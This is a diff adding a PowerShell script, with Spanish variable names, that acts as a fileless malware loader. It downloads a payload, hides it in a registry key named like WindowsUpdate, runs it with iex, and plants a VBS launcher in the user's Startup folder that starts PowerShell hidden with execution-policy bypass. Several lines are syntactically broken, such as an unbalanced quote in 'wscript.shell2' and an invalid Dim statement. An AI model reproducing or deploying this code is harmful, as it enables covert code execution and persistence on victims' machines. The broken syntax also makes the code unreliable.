@@ -1,0 +1,22 @@
+$CARGA = (New-Object Net.WebClient).DownloadString('')
+New-Item -Path HKCU:\SOFTWARE\Wow6432Node\Microsoft\WindowsUpdate -Value $CARGA
+
+#################################################################
+
+$VALOR = Get-ItemProperty -Path HKCU:\SOFTWARE\Wow6432Node\Microsoft\WindowsUpdate -Name "(Default)"
+iex ($VALOR."(Default)")
+
+
+$hf = @"
+
+Dim shell.command
+command = "powershell -wind 1 -noexit -exec bypass -file ""ruta.ps1"""
+set shell = CreateObject("wscript.shell2)
+shell.Run Command,0
+
+"@
+
+$PPP = 'ruta.ps1' + $env:USERNAME + '\Appdata\Roaming\Microsoft\windows\Start Menu\Programs\Startup\'
+$hf | Out-File c:\windows\Temp\UPDATE.vbs -Encoding ascii
+Copy-Item -Path c:\windows\Temp\UPDATE.vbs -Destination $PPP -Force
+
